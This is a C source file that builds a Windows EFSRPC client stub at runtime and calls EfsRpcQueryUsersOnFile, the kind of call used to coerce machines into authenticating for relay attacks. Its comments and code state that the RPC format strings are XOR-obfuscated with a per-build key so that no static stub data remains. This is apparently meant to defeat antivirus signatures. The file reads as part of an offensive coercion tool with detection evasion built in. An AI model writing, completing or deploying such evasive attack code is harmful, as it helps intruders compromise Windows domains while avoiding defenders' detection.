/*
 * couch_efsr_c.c - Dynamic RPC stub
 * No static NDR data - format strings built on stack at runtime
 * Compile-time XOR key from __TIME__ - changes every build
 */
#include <Windows.h>
#include <rpc.h>
#include <rpcndr.h>
#include "couch_efsr_h.h"

#define _E(b) ((unsigned char)((unsigned char)(b) ^ _K))

RPC_IF_HANDLE efsrpc_v1_0_c_ifspec = 0;

long EfsRpcOpenFileRaw(handle_t binding_h,
    PEXIMPORT_CONTEXT_HANDLE* hContext,
    wchar_t* FileName, long Flags) {
    (void)binding_h; (void)hContext; (void)FileName; (void)Flags;
    return 0x80070005L;
}

long EfsRpcQueryUsersOnFile(handle_t binding_h,
    wchar_t* FileName, long** pUsers) {

    const unsigned char _K = (unsigned char)(
        ((unsigned char)__TIME__[0] ^
            (unsigned char)__TIME__[3] ^
            (unsigned char)__TIME__[6]) | 1);

    // type format string — XOR obfuscated at compile time
    unsigned char TypeFmt[] = {
        _E(0x00), _E(0x00),
        _E(0x11), _E(0x04), _E(0x02), _E(0x00),
        _E(0x30), _E(0xa0), _E(0x00), _E(0x00),
        _E(0x11), _E(0x08),
        _E(0x25), _E(0x5c),
        _E(0x11), _E(0x14), _E(0x02), _E(0x00),
        _E(0x12), _E(0x08),
        _E(0x08), _E(0x5c),
        _E(0x00)
    };

    // proc format string for EfsRpcQueryUsersOnFile opnum 6
    unsigned char ProcFmt[] = {
        _E(0x00), _E(0x48),
        _E(0x00), _E(0x00), _E(0x00), _E(0x00),
        _E(0x06), _E(0x00),
        _E(0x20), _E(0x00),
        _E(0x32), _E(0x00),
        _E(0x00), _E(0x00),
        _E(0x00), _E(0x00),
        _E(0x38), _E(0x00),
        _E(0x46), _E(0x03),
        _E(0x0a), _E(0x01),
        _E(0x00), _E(0x00),
        _E(0x00), _E(0x00),
        _E(0x00), _E(0x00),
        _E(0x00), _E(0x00),
        // FileName [in, string]
        _E(0x0b), _E(0x01),
        _E(0x08), _E(0x00),
        _E(0x0c), _E(0x00),
        // pUsers [out]
        _E(0x12), _E(0x20),
        _E(0x10), _E(0x00),
        _E(0x0e), _E(0x00),
        // return value
        _E(0x70), _E(0x00),
        _E(0x18), _E(0x00),
        _E(0x08), _E(0x00)
    };

    // decrypt in place
    for (int i = 0; i < (int)sizeof(TypeFmt); i++) TypeFmt[i] ^= _K;
    for (int i = 0; i < (int)sizeof(ProcFmt); i++) ProcFmt[i] ^= _K;

    // build RPC client interface on stack
    RPC_CLIENT_INTERFACE ClientIf;
    RtlZeroMemory(&ClientIf, sizeof(ClientIf));
    ClientIf.Length = sizeof(RPC_CLIENT_INTERFACE);

    // interface UUID: df1941c5-fe89-4e79-bf10-463657acf44d v1.0
    ClientIf.InterfaceId.SyntaxGUID.Data1 = 0xdf194100 | 0xc5;
    ClientIf.InterfaceId.SyntaxGUID.Data2 = (unsigned short)(0xfe80 | 0x09);
    ClientIf.InterfaceId.SyntaxGUID.Data3 = (unsigned short)(0x4e70 | 0x09);
    unsigned char ifdata[8] = { 0xbf,0x10,0x46,0x36,0x57,0xac,0xf4,0x4d };
    for (int i = 0; i < 8; i++)
        ClientIf.InterfaceId.SyntaxGUID.Data4[i] = ifdata[i];
    ClientIf.InterfaceId.SyntaxVersion.MajorVersion = 1;
    ClientIf.InterfaceId.SyntaxVersion.MinorVersion = 0;

    // transfer syntax: NDR v2.0
    ClientIf.TransferSyntax.SyntaxGUID.Data1 = 0x8A885D04;
    ClientIf.TransferSyntax.SyntaxGUID.Data2 = 0x1CEB;
    ClientIf.TransferSyntax.SyntaxGUID.Data3 = 0x11C9;
    unsigned char tsdata[8] = { 0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60 };
    for (int i = 0; i < 8; i++)
        ClientIf.TransferSyntax.SyntaxGUID.Data4[i] = tsdata[i];
    ClientIf.TransferSyntax.SyntaxVersion.MajorVersion = 2;
    ClientIf.TransferSyntax.SyntaxVersion.MinorVersion = 0;

    // build stub descriptor on stack
    MIDL_STUB_DESC StubDesc;
    RtlZeroMemory(&StubDesc, sizeof(StubDesc));
    StubDesc.RpcInterfaceInformation = &ClientIf;
    StubDesc.pfnAllocate = MIDL_user_allocate;
    StubDesc.pfnFree = MIDL_user_free;
    StubDesc.pFormatTypes = TypeFmt;
    StubDesc.fCheckBounds = 1;
    StubDesc.Version = 0x60001;
    StubDesc.MIDLVersion = 0x8010274;
    StubDesc.mFlags = 0x1;

    CLIENT_CALL_RETURN ret;
    ret = NdrClientCall2(
        &StubDesc,
        (PFORMAT_STRING)ProcFmt,
        binding_h,
        FileName,
        pUsers);
    return (long)ret.Simple;
}